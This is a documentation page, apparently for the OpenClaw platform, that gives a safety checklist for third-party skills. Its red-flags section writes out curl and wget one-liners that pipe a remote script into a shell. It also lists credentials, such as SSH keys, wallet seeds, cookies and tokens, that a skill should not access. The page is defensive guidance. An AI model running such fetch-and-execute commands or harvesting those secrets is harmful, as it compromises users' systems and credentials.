---
title: Skill Safety Checklist
description: A practical checklist for safely installing, writing, and sharing OpenClaw skills.
---

# Skill Safety Checklist

Use this checklist before installing, writing, or sharing an OpenClaw skill.
Third-party skills are untrusted code. Read them before enabling.

---

## Before installing a skill

- Read the full `SKILL.md` before enabling the skill.
- Check whether the skill asks to run shell commands via `exec`.
- Prefer skills from trusted maintainers with a public history on ClawHub.
- Check the ClawHub security scan badge (VirusTotal + ClawScan) on the skill page.
- Avoid skills that request access to any of the following without a clear reason:
  - Secrets or API tokens
  - SSH keys or credentials
  - Wallet seed phrases or private keys
  - Browser cookies or session data
  - Private files outside the workspace

---

## Before writing a skill

- Keep instructions narrow and specific — only request what the skill truly needs.
- Do not include commands that fetch and execute remote code.
- Do not request access to files outside the task's scope.
- Clearly document what the skill does and what it accesses in the `description` field.
- Add safety notes in the skill body when handling sensitive data.
- Declare all required environment variables in `metadata.openclaw.requires.env`.
- Test locally with `openclaw skills list --verbose` to confirm the skill loads correctly.

---

## Red flags — do not trust skills that contain these patterns

```bash
# Fetching and executing remote scripts — never acceptable in a skill
curl https://example.com/script.sh | bash
wget https://example.com/script.sh -O- | sh
```

Also avoid skills whose instructions try to access or transmit:

- Private keys or wallet seed phrases
- SSH credentials or `~/.ssh/` contents
- Browser cookies or session tokens
- API tokens or password manager exports
- Any credential via plaintext in chat

---

## Safer patterns to look for

Prefer skills that:

- Summarize or read information without modifying files
- Ask for confirmation before running shell commands
- Explain clearly why each permission or environment variable is needed
- Use read-only operations where possible
- Scope file access to the workspace directory only (`tools.fs.workspaceOnly: true`)

---

## Financial, health, and legal skills

Skills related to finance, trading, health, or legal topics should never give professional advice.
Safe phrasing to look for:

> "This is a summary of publicly available information, not financial advice."

> "This is general information and not a substitute for medical advice."

---

## General principle

> If a skill asks for more access than it clearly needs, do not use it.

---

## Related docs

- [Skills reference](/tools/skills)
- [Creating skills](/tools/creating-skills)
- [Security](/gateway/security/)
- [Sandboxing](/gateway/sandboxing)
